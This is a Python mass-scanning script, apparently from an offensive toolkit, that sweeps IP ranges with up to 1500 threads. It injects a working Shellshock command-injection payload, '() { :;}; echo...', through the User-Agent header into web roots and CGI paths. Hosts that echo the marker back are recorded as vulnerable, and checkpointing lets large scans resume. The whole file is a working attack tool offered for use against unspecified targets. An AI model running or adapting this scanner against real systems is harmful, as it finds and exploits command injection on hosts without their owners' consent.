# ------------ Developed for MultiHackFramework by GetDrive ------------
# pip install requests colorama psutil
import argparse, os, requests, datetime, warnings, time, ipaddress, signal, sys, logging, psutil, threading, resource, socket
from colorama import Fore, init
from requests.exceptions import RequestException
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from queue import Queue
from threading import Thread, Lock

MAX_THREADS = 1500
MIN_THREADS = 300
timeout = 1.0
debug = False

sys.stderr = open(os.devnull, 'w')
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

print(f"Start Shellshock scanning: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
try:
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard_limit, hard_limit))
except ValueError as e:
    print(f"Не удалось установить лимит: {e}")
    print(f"Текущий лимит: soft={soft_limit}, hard={hard_limit}")
    resource.setrlimit(resource.RLIMIT_NOFILE, (soft_limit, hard_limit))

init(autoreset=True)

if debug:
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', filename='scan.log', filemode='a')

def parse_arguments():
    parser = argparse.ArgumentParser(description="Vulnerability scanner template")
    parser.add_argument("host", help="Target host address, CIDR notation, or filename containing a list of hosts")
    parser.add_argument("ports", nargs='?', default="", help="Target ports to scan (individual, comma-separated, or range like '80,81,90-95')")
    return parser.parse_args()

def parse_ports(port_str):
    if not port_str:
        return [80]
    ports = []
    for port_range in port_str.split(','):
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(port_range))
    return ports

CHECKPOINT_FILE = "shellshock_checkpoint.txt"
file_results = "shellshock_results.txt"

def load_last_ip():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, "r") as f:
                ip = f.read().strip()
                if ip and '/' not in ip:
                    return ip
        except Exception as e:
            if debug:
                logging.error(f"Error reading checkpoint: {e}")
    return None

checkpoint_lock = Lock()
_checkpoint_max = [None]

def save_last_ip(ip):
    if not ip or '/' in ip:
        return
    try:
        ip_obj = ipaddress.ip_address(ip)
    except ValueError:
        return
    with checkpoint_lock:
        cur = _checkpoint_max[0]
        if cur is None:
            _checkpoint_max[0] = ip
        else:
            try:
                if ip_obj > ipaddress.ip_address(cur):
                    _checkpoint_max[0] = ip
            except ValueError:
                pass

def checkpoint_flusher():
    last_written = None
    while True:
        time.sleep(5)
        with checkpoint_lock:
            ip = _checkpoint_max[0]
        if ip and ip != last_written:
            try:
                with open(CHECKPOINT_FILE, "w") as f:
                    f.write(ip + "\n")
                last_written = ip
            except Exception as e:
                if debug:
                    logging.error(f"Error writing checkpoint: {e}")

def generate_hosts(host_str):
    last_ip = load_last_ip()
    resume = bool(last_ip)

    if os.path.isfile(host_str):
        with open(host_str, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                try:
                    network = ipaddress.ip_network(line, strict=False)
                    for ip in network.hosts():
                        ip_str = str(ip)
                        if resume and ip_str != last_ip:
                            continue
                        if resume and ip_str == last_ip:
                            resume = False
                        yield ip_str
                except ValueError:
                    try:
                        ip_str = line
                        if resume and ip_str != last_ip:
                            continue
                        if resume and ip_str == last_ip:
                            resume = False
                        ipaddress.ip_address(ip_str)
                        yield ip_str
                    except ValueError:
                        pass
    else:
        try:
            network = ipaddress.ip_network(host_str, strict=False)
            for ip in network.hosts():
                ip_str = str(ip)
                if resume and ip_str != last_ip:
                    continue
                if resume and ip_str == last_ip:
                    resume = False
                yield ip_str
        except ValueError:
            try:
                ip_str = host_str
                if resume and ip_str != last_ip:
                    yield ip_str
                elif resume and ip_str == last_ip:
                    resume = False
                    yield ip_str
                else:
                    yield ip_str
            except ValueError:
                pass

results_buffer = []
results_lock = Lock()

UNIQUE_MARKER = "64654646464564654654-_VULNERABLE!"
CONTROL_MARKER = "73195317319531731953-_CONTROL_OK!"
ATTACK_PAYLOAD = f"() {{ :;}}; echo&&echo&&echo {UNIQUE_MARKER}>&1"
CONTROL_PAYLOAD = CONTROL_MARKER

CGI_PATHS = (
    "/cgi-bin/",
    "/cgi-bin/printenv",
    "/cgi-bin/test.cgi",
    "/cgi-bin/status",
    "/cgi-sys/",
)

MAX_BODY_BYTES = 65536

_PRIVATE_NETS = (
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("100.64.0.0/10"),
)

def is_private(host):
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    for net in _PRIVATE_NETS:
        try:
            if ip in net:
                return True
        except TypeError:
            continue
    return False

def marker_patterns(marker):
    return (
        "\n" + marker + "\n",
        "\r\n" + marker + "\r\n",
        "\n" + marker + "\r\n",
        "\r" + marker + "\n",
    )

def contains_marker(body, marker):
    if not body:
        return False
    for pattern in marker_patterns(marker):
        if pattern in body:
            return True
    return False

_thread_local = threading.local()

def build_session():
    session = requests.Session()
    try:
        retry = Retry(total=0, backoff_factor=0, status_forcelist=[])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=4, pool_maxsize=4)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
    except Exception:
        pass
    return session

def get_session():
    session = getattr(_thread_local, "session", None)
    if session is None:
        session = build_session()
        _thread_local.session = session
    return session

def read_limited_body(response):
    try:
        content = response.content
    except Exception:
        return ""
    if len(content) > MAX_BODY_BYTES:
        content = content[:MAX_BODY_BYTES]
    try:
        return content.decode(response.encoding or "utf-8", errors="ignore")
    except Exception:
        return ""

def probe_once(session, scheme, host, port, path, user_agent):
    url = f"{scheme}://{host}:{port}{path}"
    try:
        response = session.get(url, headers={"User-Agent": user_agent}, timeout=timeout,
                               verify=False, allow_redirects=True)
    except RequestException:
        return None
    except ValueError:
        return None
    try:
        return read_limited_body(response)
    except Exception:
        return None
    finally:
        try:
            response.close()
        except Exception:
            pass

def check_response(host, port, headers, timeout=timeout, lock=None, scanned_host_count=None, vuln_count=None):
    try:
        session = get_session()
        schemes = ("http",) if is_private(host) else ("http", "https")
        hit_url = None

        for scheme in schemes:
            control_body = probe_once(session, scheme, host, port, "/", CONTROL_PAYLOAD)
            if control_body is None:
                continue

            if not contains_marker(control_body, CONTROL_MARKER):
                attack_body = probe_once(session, scheme, host, port, "/", ATTACK_PAYLOAD)
                if attack_body and contains_marker(attack_body, UNIQUE_MARKER):
                    hit_url = f"{scheme}://{host}:{port}/"
                else:
                    for path in CGI_PATHS:
                        attack_body = probe_once(session, scheme, host, port, path, ATTACK_PAYLOAD)
                        if attack_body and contains_marker(attack_body, UNIQUE_MARKER):
                            hit_url = f"{scheme}://{host}:{port}{path}"
                            break

            break

        if hit_url:
            message = f"Vulnerability found on {hit_url}{Fore.RED}[VULNERABLE]\n"
            print(Fore.RED + message, end='', flush=True)
            try:
                with results_lock:
                    results_buffer.append(f"{host}:{port}\n")
                    with open(file_results, "a") as f:
                        f.write(f"{host}:{port}\n")
            except Exception as e:
                print(f"{Fore.YELLOW}Error writing result immediately: {e}")
            if vuln_count is not None:
                with lock:
                    vuln_count[0] += 1
    except RequestException:
        pass
    except ValueError:
        pass
    finally:
        if lock and scanned_host_count is not None:
            with lock:
                scanned_host_count[0] += 1

def worker(queue, headers, lock, scanned_host_count, vuln_count):
    while True:
        item = queue.get()
        if item is None:
            break
        host, port = item
        if debug:
            logging.info(f"Processing {host}:{port}")
        check_response(host, port, headers, lock=lock, scanned_host_count=scanned_host_count, vuln_count=vuln_count)
        save_last_ip(host)
        queue.task_done()

def print_statistics(lock, scanned_host_count, vuln_count, stop_flag):
    while not stop_flag.is_set():
        time.sleep(60)
        with lock:
            print(f"Total scanned IP addresses: {scanned_host_count[0]}, Vuln: {vuln_count[0]}, {datetime.datetime.now().strftime('%H:%M:%S')}")

def signal_handler(sig, frame):
    while True:
        response = input("\nScanning interrupted by user. Do you really want to exit? (y/n): ")
        if response.lower() == 'y':
            print("Exiting immediately...")
            stop_flag.set()
            with results_lock:
                if results_buffer:
                    with open(file_results, "a") as f:
                        f.writelines(results_buffer)
                    results_buffer.clear()
            with checkpoint_lock:
                ip = _checkpoint_max[0]
            if ip:
                try:
                    with open(CHECKPOINT_FILE, "w") as f:
                        f.write(ip + "\n")
                except Exception:
                    pass
            os._exit(0)
        elif response.lower() == 'n':
            print("Continuing the scan...")
            break
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

signal.signal(signal.SIGINT, signal_handler)

args = parse_arguments()

if os.path.exists(CHECKPOINT_FILE):
    while True:
        choice = input("Checkpoint found. Continue from last IP? (y/n): ").strip().lower()
        if choice == 'y':
            print("Resuming scan from last IP...")
            target_hosts = generate_hosts(args.host)
            break
        elif choice == 'n':
            print("Starting scan from beginning...")
            if os.path.exists(CHECKPOINT_FILE):
                os.remove(CHECKPOINT_FILE)
            target_hosts = generate_hosts(args.host)
            break
        else:
            print("Invalid input. Please enter 'y' to continue or 'n' to start over.")
else:
    target_hosts = generate_hosts(args.host)

target_ports = parse_ports(args.ports)

# === ИЗМЕНЕННЫЕ ЗАГОЛОВКИ ДЛЯ SHELLSHOCK ===
# Используем тот же пейлоад, что был в пакете пентестера
headers = {
    "User-Agent": "() { :;}; echo&&echo&&echo 64654646464564654654-_VULNERABLE!>&1"
}
# ==========================================

queue = Queue(maxsize=7000)
threads = []
max_threads = MAX_THREADS
min_threads = MIN_THREADS
lock = Lock()
scanned_host_count = [0]
vuln_count = [0]
stop_flag = threading.Event()

def adjust_threads():
    global threads
    while True:
        time.sleep(30)
        with lock:
            current_threads = len(threads)
        current_memory = psutil.virtual_memory().percent
        current_cpu = psutil.cpu_percent(interval=1)

        if current_memory > 80 and current_threads > min_threads:
            to_stop = current_threads - min_threads
            for _ in range(to_stop):
                queue.put(None)
            stopped = []
            for _ in range(to_stop):
                with lock:
                    if threads:
                        stopped.append(threads.pop())
                    else:
                        break
            for t in stopped:
                t.join(timeout=5)
        elif current_memory < 50 and current_cpu < 50 and current_threads < max_threads:
            to_add = max_threads - current_threads
            for _ in range(to_add):
                t = Thread(target=worker, args=(queue, headers, lock, scanned_host_count, vuln_count))
                t.start()
                with lock:
                    threads.append(t)

adjust_thread = Thread(target=adjust_threads)
adjust_thread.daemon = True
adjust_thread.start()

flusher_thread = Thread(target=checkpoint_flusher)
flusher_thread.daemon = True
flusher_thread.start()

stat_thread = Thread(target=print_statistics, args=(lock, scanned_host_count, vuln_count, stop_flag))
stat_thread.daemon = True
stat_thread.start()

for i in range(max_threads):
    thread = Thread(target=worker, args=(queue, headers, lock, scanned_host_count, vuln_count))
    thread.start()
    threads.append(thread)

for host in target_hosts:
    for port in target_ports:
        queue.put((host, port))

queue.join()
stop_flag.set()

with results_lock:
    if results_buffer:
        try:
            with open(file_results, "a") as f:
                f.writelines(results_buffer)
            results_buffer.clear()
        except Exception as e:
            print(f"{Fore.YELLOW}Error saving final buffer: {e}")

with checkpoint_lock:
    ip = _checkpoint_max[0]
if ip:
    try:
        with open(CHECKPOINT_FILE, "w") as f:
            f.write(ip + "\n")
    except Exception:
        pass

for i in range(max_threads):
    queue.put(None)
for thread in threads:
    thread.join(timeout=10)

print(f"Finish: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("All tasks completed.")
